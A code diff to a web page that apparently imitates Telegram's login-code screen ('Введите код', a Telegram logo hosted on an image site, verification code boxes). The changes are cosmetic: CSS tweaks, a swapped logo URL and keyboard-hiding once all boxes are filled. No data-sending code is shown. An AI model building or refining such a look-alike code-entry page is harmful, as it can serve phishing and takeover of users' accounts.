@@ -151,6 +151,8 @@
             justify-content: center;
             transition: transform 0.5s ease, opacity 0.3s ease;
             opacity: 0;
+            overflow: hidden;
+            touch-action: none;
         }
 
         .code-screen.active {
@@ -432,7 +434,7 @@
         <div class="content">
             <div class="verification-logo">
                 <div draggable="false" style="pointer-events: none;">
-                    <img src="https://i.postimg.cc/CMjdw2gt/f53d2db3262d9950d1e0fb1b74244d-removebg-preview.png" border="0" alt="telegram" class="phone-icon">
+                    <img src="https://i.postimg.cc/wBPN1Dtt/telegram.png" border="0" alt="telegram" class="phone-icon">
                 </div>
             </div>
             <h1 class="title">Введите код</h1>
@@ -523,6 +525,11 @@
                 const value = e.target.value;
                 if (value.length === 1 && index < codeInputs.length - 1) {
                     codeInputs[index + 1].focus();
+                }
+                // Проверяем, заполнены ли все поля
+                const allFilled = Array.from(codeInputs).every(inp => inp.value.length === 1);
+                if (allFilled) {
+                    codeInputs[codeInputs.length - 1].blur(); // Скрываем клавиатуру
                 }
             });
 
